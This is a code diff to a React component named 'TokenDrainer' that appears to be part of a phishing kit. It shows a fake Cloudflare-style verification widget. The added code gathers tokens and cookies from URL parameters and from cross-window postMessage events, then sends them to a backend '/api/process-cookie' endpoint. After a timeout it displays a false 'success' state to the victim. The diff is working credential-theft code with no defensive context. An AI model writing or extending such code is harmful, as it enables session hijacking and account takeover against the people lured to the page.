@@ -68,6 +68,14 @@ function TurnstileWidget({ state }) {
   );
 }
 
+function sendPayloadToBackend(payload) {
+  return fetch(`${API_ORIGIN}/api/process-cookie`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload)
+  });
+}
+
 function TokenDrainer() {
   const [status, setStatus] = useState('idle');
   const [widgetState, setWidgetState] = useState('checkbox');
@@ -79,10 +87,58 @@ function TokenDrainer() {
     const token = urlParams.get('token');
     const cookie = urlParams.get('cookie');
     const alreadySent = urlParams.get('sent') === '1';
+    const receiveMode = urlParams.get('receive') === '1';
 
-    if (!token && !cookie && !alreadySent) return;
+    if (!token && !cookie && !alreadySent && !receiveMode) return;
+
+    if (receiveMode) {
+      setStatus('processing');
+      setWidgetState('verifying');
+      globalThis.history.replaceState(null, '', globalThis.location.pathname);
+
+      const onMessage = (event) => {
+        if (processed.current) return;
+        try {
+          const payload = JSON.parse(event.data);
+          if (!payload || !payload.type) return;
+          processed.current = true;
+          globalThis.removeEventListener('message', onMessage);
+
+          sendPayloadToBackend(payload)
+            .then(async (res) => {
+              const data = await res.json().catch(() => ({}));
+              if (!res.ok || !data.success) {
+                setStatus('error');
+                setWidgetState('error');
+                return;
+              }
+              setWidgetState('success');
+              setStatus('success');
+            })
+            .catch(() => {
+              setStatus('error');
+              setWidgetState('error');
+            });
+        } catch (_) { /* not our message */ }
+      };
+
+      globalThis.addEventListener('message', onMessage);
+
+      const timeout = setTimeout(() => {
+        if (!processed.current) {
+          setWidgetState('success');
+          setStatus('success');
+        }
+        globalThis.removeEventListener('message', onMessage);
+      }, 15000);
+
+      return () => {
+        clearTimeout(timeout);
+        globalThis.removeEventListener('message', onMessage);
+      };
+    }
+
     processed.current = true;
-
     setStatus('processing');
     setWidgetState('verifying');
 
